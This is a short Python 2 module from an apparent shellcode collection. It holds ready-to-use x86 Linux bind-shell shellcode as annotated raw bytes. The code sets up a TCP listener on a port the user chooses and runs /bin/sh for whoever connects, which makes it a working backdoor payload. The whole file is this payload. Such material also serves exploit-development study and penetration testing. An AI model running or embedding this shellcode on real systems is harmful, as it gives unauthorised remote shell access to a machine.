#############################################################################################
# title         : x86_linux_bindport
# description   : Shellcode for x86 GNU/Linux systems that create a simple backdoor over TCP
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#############################################################################################
import struct
class Shellcode:
    @staticmethod
    def get():
        shellcode = Shellcode.shellcode

        # Define port
        port = raw_input("Port [4444] : ")
        if not port:
            port = 4444

        port = struct.pack(">H", port)
        if "\x00" in port:
            print "[-] The hex value of your port number (%s) contains \\x00." % port
            exit(1)
        
        shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68"+port)
        return shellcode
        
    shellcode = (
        "\x31\xdb"               # 0x00000000:     xor ebx,ebx
        "\x53"                   # 0x00000002:     push ebx
        "\x43"                   # 0x00000003:     inc ebx
        "\x53"                   # 0x00000004:     push ebx
        "\x6a\x02"               # 0x00000005:     push byte +0x2
        "\x6a\x66"               # 0x00000007:     push byte +0x66
        "\x58"                   # 0x00000009:     pop eax
        "\x99"                   # 0x0000000A:     cdq
        "\x89\xe1"               # 0x0000000B:     mov ecx,esp
        "\xcd\x80"               # 0x0000000D:     int 0x80 ; socket()
        "\x96"                   # 0x0000000F:     xchg eax,esi
        "\x43"                   # 0x00000010:     inc ebx
        "\x52"                   # 0x00000011:     push edx
        "\x66\x68\x41\x42"       # 0x00000012:     push word 0x4241 ; port = 0x4142
        "\x66\x53"               # 0x00000016:     push bx
        "\x89\xe1"               # 0x00000018:     mov ecx,esp
        "\x6a\x66"               # 0x0000001A:     push byte +0x66
        "\x58"                   # 0x0000001C:     pop eax
        "\x50"                   # 0x0000001D:     push eax
        "\x51"                   # 0x0000001E:     push ecx
        "\x56"                   # 0x0000001F:     push esi
        "\x89\xe1"               # 0x00000020:     mov ecx,esp
        "\xcd\x80"               # 0x00000022:     int 0x80 ; bind()
        "\xb0\x66"               # 0x00000024:     mov al,0x66
        "\xd1\xe3"               # 0x00000026:     shl ebx,1
        "\xcd\x80"               # 0x00000028:     int 0x80 ; listen()
        "\x52"                   # 0x0000002A:     push edx
        "\x52"                   # 0x0000002B:     push edx
        "\x56"                   # 0x0000002C:     push esi
        "\x43"                   # 0x0000002D:     inc ebx
        "\x89\xe1"               # 0x0000002E:     mov ecx,esp
        "\xb0\x66"               # 0x00000030:     mov al,0x66
        "\xcd\x80"               # 0x00000032:     int 0x80 ; accept()
        "\x93"                   # 0x00000034:     xchg eax,ebx
        "\x6a\x02"               # 0x00000035:     push byte +0x2
        "\x59"                   # 0x00000037:     pop ecx
        "\xb0\x3f"               # 0x00000038:     mov al,0x3f
        "\xcd\x80"               # 0x0000003A:     int 0x80 ; dup2()
        "\x49"                   # 0x0000003C:     dec ecx
        "\x79\xf9"               # 0x0000003D:     jns 0x38
        "\xb0\x0b"               # 0x0000003F:     mov al,0xb
        "\x52"                   # 0x00000041:     push edx
        "\x68\x2f\x2f\x73\x68"   # 0x00000042:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000047:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000004C:     mov ebx,esp
        "\x52"                   # 0x0000004E:     push edx
        "\x53"                   # 0x0000004F:     push ebx
        "\x89\xe1"               # 0x00000050:     mov ecx,esp
        "\xcd\x80"               # 0x00000052:     int 0x80 ; execve()
    )
